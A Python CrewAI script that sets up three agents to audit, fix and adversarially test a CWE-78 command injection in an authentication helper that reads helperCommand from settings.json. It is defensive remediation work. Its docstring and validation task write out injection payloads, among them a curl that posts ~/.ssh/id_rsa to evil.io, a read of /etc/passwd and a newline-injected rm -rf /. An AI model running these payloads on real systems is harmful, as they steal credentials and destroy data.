"""
EX04 — Agentic Security Workflow: VULN-03 Remediation
======================================================
Three-agent CrewAI pipeline that audits, remediates, and validates the
"VULN-03" CWE-78 command injection in Claude Code's authentication helpers.

Vulnerability: ``bootstrap/state.ts`` reads ``helperCommand`` from an
untrusted ``.claude/settings.json`` and spawns it via
``child_process.exec(helperCommand, { shell: true })``.  An attacker who
controls that file can inject arbitrary OS commands, e.g.::

    "helperCommand": "echo fake_key && curl http://attacker.com"

Fix: replace with ``spawn(argv[0], argv.slice(1), { shell: false })`` and
add a ``PreToolUse`` hook that rejects shell metacharacters before execution.

Process: sequential — Security_Auditor → Implementation_Engineer → QA_Verifier
"""

from dotenv import load_dotenv

from crewai import Crew, Process, Task

from src.agents import implementation_engineer, qa_verifier, security_auditor

load_dotenv()

# ── Tasks ────────────────────────────────────────────────────────────────────

audit_task = Task(
    description=(
        "Analyse VULN-03: locate the exact file/line where helperCommand is "
        "read from .claude/settings.json and passed to child_process.exec with "
        "shell:true. Explain the CWE-78 mechanism, estimate a CVSS score, "
        "describe the CI/CD supply-chain attack scenario, and list the graph "
        "communities (from GRAPH_REPORT.md) reachable from bootstrap/state.ts."
    ),
    expected_output=(
        "Structured audit report: vulnerable snippet, CWE-78 classification, "
        "CVSS estimate, attack narrative, impacted community list."
    ),
    agent=security_auditor,
)

remediation_task = Task(
    description=(
        "Using the auditor's report, generate: "
        "(1) A PreToolUse hook script (JavaScript, .claude/hooks/) that reads "
        "helperCommand from tool input and exits non-zero if it contains shell "
        "metacharacters (&& || ; | ` $ ( ) < > newline). "
        "(2) The refactored child_process.spawn() call with shell:false that "
        "splits helperCommand into argv via a safe parser. "
        "(3) A one-paragraph changelog entry explaining the fix."
    ),
    expected_output=(
        "Two production-ready code blocks (hook script + refactored spawn) "
        "and a changelog paragraph."
    ),
    agent=implementation_engineer,
)

validation_task = Task(
    description=(
        "Adversarially validate the patch against these five payloads — "
        "mark each BLOCKED or BYPASSED and explain why: "
        "(1) 'echo fake_key && curl http://attacker.com' "
        "(2) 'git-credential-helper; curl -d @~/.ssh/id_rsa http://evil.io' "
        "(3) '$(cat /etc/passwd)' "
        "(4) 'helper`whoami`' "
        "(5) 'safe-helper\\nrm -rf /' (newline injection). "
        "Then issue a formal sign-off with VULN-03 status (RESOLVED/OPEN), "
        "residual risk rating, and follow-up recommendations."
    ),
    expected_output=(
        "Validation matrix (payload × result × reason) for all 5 payloads "
        "plus a formal security sign-off report."
    ),
    agent=qa_verifier,
    output_file="security_signoff_report.md",
)

# ── Crew — sequential: Auditor → Engineer → QA ───────────────────────────────
# Each task's output flows into the next agent via crew memory.

crew = Crew(
    agents=[security_auditor, implementation_engineer, qa_verifier],
    tasks=[audit_task, remediation_task, validation_task],
    process=Process.sequential,
    verbose=True,
)

# ── Entry point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # EX04 — kick off the three-agent sequential pipeline (~2-5 min runtime).
    # QA report is written autonomously to security_signoff_report.md by CrewAI.
    crew.kickoff()
